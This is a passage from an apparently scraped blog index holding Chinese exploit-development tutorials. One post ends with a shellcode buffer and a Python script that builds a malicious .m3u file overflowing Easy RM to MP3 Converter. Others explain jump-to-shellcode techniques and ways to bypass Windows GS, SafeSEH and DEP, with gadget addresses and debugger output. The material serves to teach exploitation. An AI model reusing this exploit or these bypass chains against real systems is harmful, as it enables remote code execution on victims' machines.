class=\"symbol\">\\x</span>66<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>7C<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>02<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>75<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>65\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>72<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>D0<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>6F<span class=\"symbol\">\\x</span>78<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>01<span class=\"symbol\">\\x</span>8B\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>DF<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>5C<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>67<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>42\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>4D<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>24\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>2C<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>4F<span class=\"symbol\">\\x</span>5F<span class=\"symbol\">\\x</span>6F<span class=\"symbol\">\\x</span>21<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>DC<span class=\"symbol\">\\x</span>57\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>D0<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>01\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>DF<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>5C<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>72<span class=\"symbol\">\\x</span>6F\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>63<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>78<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>24\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>40<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>40<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>D0\");</div><div class=\"line\">\t</div><div class=\"line\">ret = \"<span class=\"symbol\">\\x</span>7B<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>86<span class=\"symbol\">\\x</span>7C\";</div><div class=\"line\">filename = \"crash.m3u\"</div><div class=\"line\">f = open(filename,'w')</div><div class=\"line\">data = 'A' * 26103 + ret + '<span class=\"symbol\">\\x</span>90' * 4 + shellcode</div><div class=\"line\">f.write(data)</div><div class=\"line\">f.close()</div></pre></td></tr></table></figure>\n<p>使用Easy RM to MP3 Converter加载这个crash.m3u文件，OK，成功了！！！</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ez0pdv48mlj30bo04cwez.jpg\" alt=\"\"></p>\n<h1 id=\"Ⅶ、参考文献\"><a href=\"#Ⅶ、参考文献\" class=\"headerlink\" title=\"Ⅶ、参考文献\"></a>Ⅶ、参考文献</h1><p><a href=\"https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/\" target=\"_blank\" rel=\"external\">https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/</a><br><a href=\"http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2014/03/16/exploit-buffer-overflow/\" target=\"_blank\" rel=\"external\">exploit编写笔记1——基于栈的溢出</a></p>\n"},{"title":"预设事件 preset events","url":"http://huirong.github.io/2015/11/17/preset-events/","content":""},{"title":"native_event","url":"http://huirong.github.io/2015/11/17/native-event/","content":""},{"title":"PAPI","url":"http://huirong.github.io/2015/11/17/PAPI/","content":""},{"title":"跳转到 shellcode 方法","url":"http://huirong.github.io/2015/09/23/jump-to-shellcode/","content":"<p>假设：假设shellcode已经在栈中，并且没有开启DEP<br>本文将就此讲述关于执行/跳转至shellcode的其它方法，最后你要面临的问题就是缓冲区是否足够大。<br><a id=\"more\"></a></p>\n<h1 id=\"I、jump-call-到一个指向shellcode-的寄存器。\"><a href=\"#I、jump-call-到一个指向shellcode-的寄存器。\" class=\"headerlink\" title=\"I、jump/call 到一个指向shellcode 的寄存器。\"></a>I、jump/call 到一个指向shellcode 的寄存器。</h1><p>利用这种技术，你可以利用这个包含shellcode地址的寄存器，将该地址置入EIP中来实现。</p>\n<p>你可以利用程序运行时加载的DLL，去搜索”jump/call register”等操作指令所在的内存地址。当构造payload时，我们就可以利用该内存地址去覆盖EIP。当然，如果有一个直接指向shellcode 的寄存器可以利用，那也不是不可以的。</p>\n<h1 id=\"II、pop-return\"><a href=\"#II、pop-return\" class=\"headerlink\" title=\"II、pop return\"></a>II、pop return</h1><p>如果栈顶并没有指向攻击者指定的缓冲区，但此缓冲区又起始于栈顶下方的数字节处，那么你就可以使程序执行一系列的POP指令和一个RET指令，以此将这些字节弹出栈（每POP 一次，ESP 指针就更接近shellcode 入口一步），直至正确的缓冲区入口处。执行RET指令后，ESP 中的当前栈值将放入EIP 中。</p>\n<p>因此当ESP+x 包含我们的shellcode所在的缓冲区地址时（当在调试器中执行命令“d esp”时，你就可以看到在ESP+offset 中的缓冲区地址，但由于Intel x86 是属于小端法机器，因此数据可能是反序的），POP RET 方法还是可行的。</p>\n<h1 id=\"III、push-return\"><a href=\"#III、push-return\" class=\"headerlink\" title=\"III、push return\"></a>III、push return</h1><p> 这种方法明显不同于“call register”技术。如果你找不到<jump register=\"\">或者<call register=\"\">的机器码，那么你可以简单将一个地址压栈，然后执行ret，因此你只需搜索ret 之后的push <register>指令即可。先查找这一串操作指令，再查找执行这串指令的地址，最后利用该地址覆盖EIP。</register></call></jump></p>\n<h1 id=\"Ⅳ、jmp-reg-offset\"><a href=\"#Ⅳ、jmp-reg-offset\" class=\"headerlink\" title=\"Ⅳ、jmp [reg + offset]\"></a>Ⅳ、jmp [reg + offset]</h1><p> 如果寄存器指向包含shellcode 地址的缓冲区，但其并没有指向shellcode 入口，那么你可以通过搜索操作系统或者应用程序加载的DLL 中的指令，并向该指令中的寄存器添加上所需的字节偏移量，然后跳转至寄存器所指向的地址。笔者将此种方法称为jmp [reg+ offset]。</p>\n<h1 id=\"V、blind-return\"><a href=\"#V、blind-return\" class=\"headerlink\" title=\"V、blind return\"></a>V、blind return</h1><p>假设ESP 指向当前栈基址。RET 指令将从栈中‘pop’新值（4 字节），然后将那地址放入ESP 中。因此如果用RET 指令所在地址去覆盖EIP，那么你将会把ESP 中的值置入ESI。</p>\n<p>如果缓冲区中的可用空间被限制了（EIP 被覆盖之后），但是在覆写EIP 之前还有不少空间可利用，那么你可以先在小空间的缓冲区中执行jump code，以跳转至缓冲区首部的关键shellcode。</p>\n<h1 id=\"Ⅵ、SHE\"><a href=\"#Ⅵ、SHE\" class=\"headerlink\" title=\"Ⅵ、SHE\"></a>Ⅵ、SHE</h1><p>每一程序中均有默认的异常处理程序，这是由操作系统提供的。因此即使程序原本就没有使用异常处理，但你也可以用自己的地址去覆盖SHE handler，以使其跳转至shellcode。</p>\n<p>利用SHE 可以使exploit 在windows 平台下运行得更为稳定，但在利用SHE 编写exploit 之前，你需要先掌握一些知识。如果你编写的exploit 无法在被给的操作系统中运行，那么payload 可能会导致程序崩溃（触发异常）。因此你可以将“regular”exploit 配合覆盖SHE 的方式来编写exploit，以此编写出更为可靠的exploit。</p>\n<p>在一个被覆写EIP 的典型栈溢出中，也可以利用SHE 技术来编写exploit，以使其运行得更为稳定，同时获取更大可用空间的缓冲区（覆盖EIP 以触发SHE„„真可谓一箭双雕）。</p>\n"},{"title":"Move_Zeros","url":"http://huirong.github.io/2015/09/23/Move-Zeros/","content":""},{"title":"Windows 溢出保护原理与绕过方法","url":"http://huirong.github.io/2015/09/17/Win-overfolw-mitigation-and-bypass/","content":"<p>本文转载自<a href=\"http://www.blogbus.com/riusksk-logs/80935313.html\" target=\"_blank\" rel=\"external\">windows溢出保护原理与绕过方法概览</a><br>作者：riusksk（泉哥）<br><a id=\"more\"></a></p>\n<p>本篇文章主要揭露Windows平台上的各种溢出保护机制原理及绕过方法</p>\n<h1 id=\"I、GS编译选项\"><a href=\"#I、GS编译选项\" class=\"headerlink\" title=\"I、GS编译选项\"></a>I、GS编译选项</h1><h2 id=\"①-原理\"><a href=\"#①-原理\" class=\"headerlink\" title=\"① 原理\"></a>① 原理</h2><p>通过VC++编译器在函数前后添加额外的处理代码，前部分用于由伪随机数生成的cookie并放入.data节段，当本地变量初始化，就会向栈中插入cookie，它位于局部变量和返回地址之间：</p>\n<p>经GS编译后栈中的巨变变量空间分配情况：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">sub</span> <span class=\"built_in\">esp</span> <span class=\"number\">24h</span></div><div class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>,<span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [__security_cookie(<span class=\"number\">408040h</span>)]</div><div class=\"line\"><span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span>,<span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">esp</span>+<span class=\"number\">24h</span>]</div><div class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">esp</span>+<span class=\"number\">20h</span>],<span class=\"built_in\">eax</span></div></pre></td></tr></table></figure></p>\n<p>在函数尾部的额外代码用于函数返回时，调用security_check_cookie()函数，以判断cookie是否被修改过，当函数返回时的情况如下：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">mov</span> <span class=\"built_in\">ecx</span>,<span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">esp</span>+<span class=\"number\">20h</span>]</div><div class=\"line\"><span class=\"keyword\">xor</span> <span class=\"built_in\">ecx</span>,<span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">esp</span>+<span class=\"number\">24h</span>]</div><div class=\"line\"><span class=\"keyword\">add</span> <span class=\"built_in\">esp</span>,<span class=\"number\">24h</span></div><div class=\"line\"><span class=\"keyword\">jmp</span> __security_check_cookie(<span class=\"number\">4010B2h</span>)</div></pre></td></tr></table></figure></p>\n<p>在缓冲区溢出利用时，如果将恶意代码从局部变量覆盖到返回地址，那么自然就会覆写cookie，当检测到与原始cookie不同时（也就是比较上面408040h 与 4010B2h 两处的cookie值），就会触发异常，最后终止进程。</p>\n<h2 id=\"②-绕过方法\"><a href=\"#②-绕过方法\" class=\"headerlink\" title=\"② 绕过方法\"></a>② 绕过方法</h2><h3 id=\"1-猜测-计算cookie\"><a href=\"#1-猜测-计算cookie\" class=\"headerlink\" title=\"(1)猜测/计算cookie\"></a>(1)猜测/计算cookie</h3><p>Reducing the Effective Entropy of GS Cookie:<a href=\"http://www.uninformed.org/?v=7&amp;a=2&amp;t=html\" target=\"_blank\" rel=\"external\">http://www.uninformed.org/?v=7&amp;a=2&amp;t=html</a><br>自从覆盖SEH的方法出现后，这种方法已基本不用了，它没有后面的方法来得简便。</p>\n<h3 id=\"2-覆盖SEH\"><a href=\"#2-覆盖SEH\" class=\"headerlink\" title=\"(2)覆盖SEH\"></a>(2)覆盖SEH</h3><p>由于当security_check_cookie()函数检测到cookie被更改后，会检查是否安装了安全处理例程，也就是SEH结点中保存的指针，如果没有，那么由系统的异常处理器接管，因为我们可以通过（pop pop ret）覆盖SEH来达到溢出的目的。<br>但对于SafeSEH保护的模块，就可能会导致exploit失效，关于它的绕过在后续部分在述。</p>\n<p>辅助工具：OD插件safeSEH、pattern_create、pattern_offset、msfpescan、memdump</p>\n<h3 id=\"3-覆盖虚表指针\"><a href=\"#3-覆盖虚表指针\" class=\"headerlink\" title=\"(3)覆盖虚表指针\"></a>(3)覆盖虚表指针</h3><p>堆栈布局：[局部变量][cookie][入栈寄存器][返回地址][参数][虚表指针]<br>当把虚表指针覆盖后，由于要执行虚函数得通过虚表指针来搜索，即可借此劫持eip。</p>\n<h1 id=\"II、SafeSEH\"><a href=\"#II、SafeSEH\" class=\"headerlink\" title=\"II、SafeSEH\"></a>II、SafeSEH</h1><h2 id=\"①-原理-1\"><a href=\"#①-原理-1\" class=\"headerlink\" title=\"① 原理\"></a>① 原理</h2><p>为了防止 SEH 结点被攻击者恶意利用，微软在 .net 编译器中加入 /sdeseh 编译选项引入 SafeSEH 技术。<br>编译器在编译时，将PE文件所有合法的异常处理例程的地址解析出来制成一张表，放在PE文件的数据块 (LQAJ-CON-FIG)中，并使用 shareuse 内存中的一个随机数加密，用于匹配检查。如果该 PE 文件不支持 SafeSEH ，则表中的地址为0。当 PE 文件被系统加载后，表中的内容被加密保存到 ntdll.dll 模块的某个数据区。在PE文件运行期间，如果发生异常需要调用异常处理例程，系统会逐个该例程在表中是否有记录：如果没有，则说明该例程非法，进而不执行该异常例程。</p>\n<h2 id=\"②-绕过方法-1\"><a href=\"#②-绕过方法-1\" class=\"headerlink\" title=\"② 绕过方法\"></a>② 绕过方法</h2><p>利用SafeSEH保护模块之外的地址<br>对于目前的大部分Windows操作系统，其系统模块都受SafeSEH保护，可以选用未开启SafeSEH保护的模块来利用。<br>比如漏洞软件本身自带的dll文件，这个可以借助OD插件SafeSEH来查看进程中各模块是否开启SafeSEH保护。除此之外，也可以通过直接覆盖返回地址 ( jmp/call esp ) 来利用。另一种方法，如果 esp + 8 指向EXCEPTION_REGISTRATION结构，那么你仍然可以宣召一个 pop/pop/ret 指令组合（在加载模块的地址范围之外的空间），也可以正常工作。但如果你在程序的加载模块中找不到 pop/pop/ret 指令，你可以观察下 esp/ebp，查看下这些寄存器距离 nesp 的编译，接下来就是查找这样的指令：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">call</span> <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span>[<span class=\"built_in\">esp</span>+nn] / <span class=\"keyword\">jmp</span> <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span>[<span class=\"built_in\">esp</span>+nn] </div><div class=\"line\"><span class=\"keyword\">call</span> <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span>[<span class=\"built_in\">ebp</span>+nn] / <span class=\"keyword\">jmp</span> <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span>[<span class=\"built_in\">ebp</span>+nn] </div><div class=\"line\"><span class=\"keyword\">call</span> <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span>[<span class=\"built_in\">ebp</span>-nn] / <span class=\"keyword\">jmp</span> <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span>[<span class=\"built_in\">ebp</span>-nn]</div></pre></td></tr></table></figure></p>\n<p>（其中的 nn 就是寄存器的值到 nseh 的偏移，偏移 nn 可能是：esp+8，esp+14，esp+1c,esp+2c,esp+44,esp+50,ebp+0c,ebp+24,ebp+30,ebp-04,ebp-0c,ebp-18）.</p>\n<p>如果遇到以上指令是以NULL字节结尾的，可将shellcode放置在SEH之前：</p>\n<ul>\n<li>在nseh上放置后的跳转指令（跳转7字节：jmp 0xfffffff9）;</li>\n<li>向后跳转足够长的地址以存放shellcode，并借此执行只shellcode；</li>\n<li>把shellcode放在用于覆盖异常处理结构的指令地址之前</li>\n</ul>\n<h1 id=\"III、DEP\"><a href=\"#III、DEP\" class=\"headerlink\" title=\"III、DEP\"></a>III、DEP</h1><h2 id=\"①-原理-2\"><a href=\"#①-原理-2\" class=\"headerlink\" title=\"① 原理\"></a>① 原理</h2><p>数据执行保护(DEP)是一套软硬件技术，能够在内存上执行额外检查以防止在不可运行的内存区域上执行代码。在Microsoft Windows XP Service Pack 2、Microsoft Windows 2003 Service Pack 1、Microsoft Windows XP Edition 2005、Microsoft Windows Vista 和 Windows 7中，由硬件和软件一起强制实施DEP。DEP有两种模式，吐过CPU支持内存页NX属性，就是硬件支持DEP。只有当处理器/系统支持NX/XD(禁止执行)时，Windows才能拥有硬件DEP，否则只能支持软件DEP，详单与只有SafeSEH保护。</p>\n<h2 id=\"②-绕过方法-2\"><a href=\"#②-绕过方法-2\" class=\"headerlink\" title=\"② 绕过方法\"></a>② 绕过方法</h2><h3 id=\"1-ret2lib\"><a href=\"#1-ret2lib\" class=\"headerlink\" title=\"(1)ret2lib\"></a>(1)ret2lib</h3><p>思路：将返回地址指向lib库中的代码，而不是直接跳转到shellcode中去执行，进而实现恶意代码的运行。</p>\n<p>可以在库中找到一段执行系统命令的大妈，比如system()函数，用它的地址覆盖返回地址，此时即使NX/XD禁止在堆栈上执行代码，但库中的代码依然是可以执行的。</p>\n<ul>\n<li>函数system()可通过运行环境来执行其它程序，例如启动Shell等等。</li>\n<li>另外，还可以通过VirtualProtect函数来修改恶意代码所在内存页面 的执行权限，然后再将控制转移到恶意代码，其堆栈布局如下所示：</li>\n</ul>\n<h3 id=\"2-利用TEB突破DEP\"><a href=\"#2-利用TEB突破DEP\" class=\"headerlink\" title=\"(2)利用TEB突破DEP\"></a>(2)利用TEB突破DEP</h3><p>在之前的《黑客防线》中有篇文章《SP2下利用TEB执行ShellCode》，有兴趣的读者可以翻看黑防出版的《缓冲区溢出攻击与防范专辑》，上面有这 篇文章。该作者在文中提到一种利用TEB（线程环境块）来突破DEP的方法，不过它受系统版本限制，只能在XP sp2及其以下版本的windows系统 上使用，因为更高版本的系统，其TEB地址是不固定的，每次都是动态生成的。<br>该方法的具体实现方法如下：</p>\n<ul>\n<li>将返回地址覆盖成字符串复制函数的地址，比如lstrcpy，memcpy等等；</li>\n<li>在返回地址之后用目标内存地址和shellcode地址覆盖，当执行复制操作时，就会将shellcode复制到目标内存地址，该目标内存地址位于TEB偏移0xC00的地方，它有520字节缓存用于ANSI-to-Unicode函数的转换；</li>\n<li>复制操作结束后返回到shellcode地址并执行它。<br>此时其堆栈布局如下：<br>【shellcode】【save ebp】【lstrcpy】【TEB缓存地址，用于复制结束后返回到shellcode】【TEB缓存地址】【ShellCode地址】</li>\n</ul>\n<h3 id=\"3-关闭DEP\"><a href=\"#3-关闭DEP\" class=\"headerlink\" title=\"(3)关闭DEP\"></a>(3)关闭DEP</h3><p>关于此方法最原始的资料应该是黑客杂志《uninformed》上的文章《Bypassing Windows Hardware- enforced Data Execution Prevention》（<a href=\"http://www.uninformed.org/?v=2&amp;\" target=\"_blank\" rel=\"external\">http://www.uninformed.org/?v=2&amp;</a> a=4），另外也可以看下本人之前翻译的《突破win2003 sp2中基于硬件的DEP》（<a href=\"http://bbs.pediy.com/showthread.php?t=99045\" target=\"_blank\" rel=\"external\">http://bbs.pediy.com/showthread.php?t=99045</a>.），此方法的主要原理就是利用NtSetInformationProcess()函数来设置 KPROCESS 结构中的相关标志位，进而关闭DEP，KPROCESS结构中相关标志位情况如下：<br><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">0</span>:<span class=\"number\">000</span>&gt; dt nt!_KPROCESS -r</div><div class=\"line\">ntdll!_KPROCESS</div><div class=\"line\">. . .</div><div class=\"line\">+<span class=\"number\">0</span>x06b <span class=\"attribute\">Flags       </span>: _KEXECUTE_OPTIONS</div><div class=\"line\">  +<span class=\"number\">0</span>x000 <span class=\"attribute\">ExecuteDisable     </span>: Pos <span class=\"number\">0</span>, <span class=\"number\">1</span> Bit</div><div class=\"line\">  +<span class=\"number\">0</span>x000 <span class=\"attribute\">ExecuteEnable     </span>: Pos <span class=\"number\">1</span>, <span class=\"number\">1</span> Bit</div><div class=\"line\">  +<span class=\"number\">0</span>x000 <span class=\"attribute\">DisableThunkEmulation   </span>: Pos <span class=\"number\">2</span>, <span class=\"number\">1</span> Bit</div><div class=\"line\">  +<span class=\"number\">0</span>x000 <span class=\"attribute\">Permanent     </span>: Pos <span class=\"number\">3</span>, <span class=\"number\">1</span> Bit</div><div class=\"line\">  +<span class=\"number\">0</span>x000 <span class=\"attribute\">ExecuteDispatchEnable   </span>: Pos <span class=\"number\">4</span>, <span class=\"number\">1</span> Bit</div><div class=\"line\">  +<span class=\"number\">0</span>x000 <span class=\"attribute\">ImageDispatchEnable   </span>: Pos <span class=\"number\">5</span>, <span class=\"number\">1</span> Bit</div><div class=\"line\">  +<span class=\"number\">0</span>x000 <span class=\"attribute\">Spare       </span>: Pos <span class=\"number\">6</span>, <span class=\"number\">2</span> Bits</div></pre></td></tr></table></figure></p>\n<p>当DEP 被启用时，ExecuteDisable 被置位，当DEP 被禁用，ExecuteEnable 被置位，当Permanent 标志置位时表示这些设置是最终设置，不可更改。代码实现：<br><figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE<span class=\"comment\">;</span></div><div class=\"line\">NtSetInformationProcess(</div><div class=\"line\">  <span class=\"name\">NtCurrentProcess</span>(),   // ProcessHandle = <span class=\"number\">-1</span></div><div class=\"line\">  ProcessExecuteFlags,   // ProcessInformationClass = <span class=\"number\">0</span>x22（ProcessExecuteFlags）</div><div class=\"line\">  <span class=\"symbol\">&amp;ExecuteFlags</span>,     // ProcessInformation = <span class=\"number\">0</span>x2（MEM_EXECUTE_OPTION_ENABLE）</div><div class=\"line\">  sizeof(<span class=\"name\">ExecuteFlags</span>))<span class=\"comment\">;   // ProcessInformationLength = 0x4</span></div></pre></td></tr></table></figure></p>\n<p>具体实现思路（以我电脑上VirtualBox虚拟机下的xp sp3为例）：<br><strong>1) 将al设置为1</strong><br>比如指令mov al,1 / ret，然后用该指令地址覆盖返回地址：<br><figure class=\"highlight tap\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">0:000&gt; lmm ntdll</div><div class=\"line\">start    end        module name</div><div class=\"line\">7c920000 7c9b3000   ntdll      (pdb symbols)          c:\\symbollocal\\ntdll.pdb\\1751003260CA42598C0FB326585000ED2\\ntdll.pdb</div><div class=\"line\">0:000&gt; s 7c920000 l<span class=\"number\"> 93000 </span>b0<span class=\"number\"> 01 </span>c2 04</div><div class=\"line\">7c9718ea  b0<span class=\"number\"> 01 </span>c2<span class=\"number\"> 04 </span>00<span class=\"number\"> 90 </span>90 90-90<span class=\"number\"> 90 </span>8b ff<span class=\"number\"> 55 </span>8b ec<span class=\"number\"> 56 </span> ............U..V</div><div class=\"line\">0:000&gt; u 7c9718ea</div><div class=\"line\">ntdll!NtdllOkayToLockRoutine:</div><div class=\"line\">7c9718ea b001            mov     al,1</div><div class=\"line\">7c9718ec c20400          ret     4</div></pre></td></tr></table></figure></p>\n<p>由于上面的ret 4，因此要再向栈中填充4字节（比如0xffffffff）以抵消多弹出的4字节，如果选择的指令刚好是ret则无须再多填充4字节。</p>\n<p><strong>2)跳转到ntdll!LdrpCheckNXCompatibility</strong><br>跳转到ntdll!LdrpCheckNXCompatibility中的部分代码（从cmp al,1 开始，可通过windbg下的命令 uf ntdll!LdrpCheckNXCompatibility来查看其反汇编代码），比如以下地址就需要用0x7c93cd24来覆写堆栈上的第 二个地址：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">ntdll!LdrpCheckNXCompatibility+<span class=\"number\">0x13</span>:</div><div class=\"line\">7c93cd24 3c01            <span class=\"keyword\">cmp</span>     <span class=\"built_in\">al</span>,<span class=\"number\">1</span></div><div class=\"line\">7c93cd26 6a02            <span class=\"keyword\">push</span>    <span class=\"number\">2</span></div><div class=\"line\">7c93cd28 5e              <span class=\"keyword\">pop</span>     <span class=\"built_in\">esi</span></div><div class=\"line\">7c93cd29 0f84df290200    <span class=\"keyword\">je</span>      ntdll!LdrpCheckNXCompatibility+<span class=\"number\">0x1a</span> (7c95f70e)  <span class=\"comment\">; 之前已将al置1，故此处实现跳转</span></div></pre></td></tr></table></figure></p>\n<p><strong>3)上面跳转后来到这里：</strong><br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>:<span class=\"number\">000</span>&gt; u 7c95f70e</div><div class=\"line\">ntdll!LdrpCheckNXCompatibility+<span class=\"number\">0x1a</span>:</div><div class=\"line\">7c95f70e 8975fc          <span class=\"keyword\">mov</span>     <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">ebp</span>-<span class=\"number\">4</span>],<span class=\"built_in\">esi</span>  <span class=\"comment\">; [ebp-0x4]= esi = 2</span></div><div class=\"line\">7c95f711 e919d6fdff      <span class=\"keyword\">jmp</span>     ntdll!LdrpCheckNXCompatibility+<span class=\"number\">0x1d</span> (7c93cd2f)</div></pre></td></tr></table></figure></p>\n<p><strong>4)上面跳转后来到：</strong><br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>:<span class=\"number\">000</span>&gt; u 7c93cd2f</div><div class=\"line\">ntdll!LdrpCheckNXCompatibility+<span class=\"number\">0x1d</span>:</div><div class=\"line\">7c93cd2f 837dfc00        <span class=\"keyword\">cmp</span>     <span class=\"built_in\">dword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">ebp</span>-<span class=\"number\">4</span>],<span class=\"number\">0</span></div><div class=\"line\">7c93cd33 0f85f89a0100    <span class=\"keyword\">jne</span>     ntdll!LdrpCheckNXCompatibility+<span class=\"number\">0x4d</span> (7c956831) <span class=\"comment\">; 不相等再次实现跳转</span></div></pre></td></tr></table></figure></p>\n<p><strong>5)上面跳转后来到：</strong><br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>:<span class=\"number\">000</span>&gt; u 7c956831</div><div class=\"line\">ntdll!LdrpCheckNXCompatibility+<span class=\"number\">0x4d</span>:</div><div class=\"line\">7c956831 6a04            <span class=\"keyword\">push</span>    <span class=\"number\">4</span>     <span class=\"comment\">;ProcessInformationLength = 4</span></div><div class=\"line\">7c956833 8d45fc          <span class=\"keyword\">lea</span>     <span class=\"built_in\">eax</span>,[<span class=\"built_in\">ebp</span>-<span class=\"number\">4</span>]</div><div class=\"line\">7c956836 <span class=\"number\">50</span>              <span class=\"keyword\">push</span>    <span class=\"built_in\">eax</span>      <span class=\"comment\">;ProcessInformation = 2（MEM_EXECUTE_OPTION_ENABLE）</span></div><div class=\"line\">7c956837 6a22            <span class=\"keyword\">push</span>    <span class=\"number\">22h</span>       <span class=\"comment\">;ProcessInformationClass = 0x22（ProcessExecuteFlags）</span></div><div class=\"line\">7c956839 6aff            <span class=\"keyword\">push</span>    <span class=\"number\">0FFFFFFFFh</span></div><div class=\"line\">7c95683b e84074fdff      <span class=\"keyword\">call</span>    ntdll!ZwSetInformationProcess 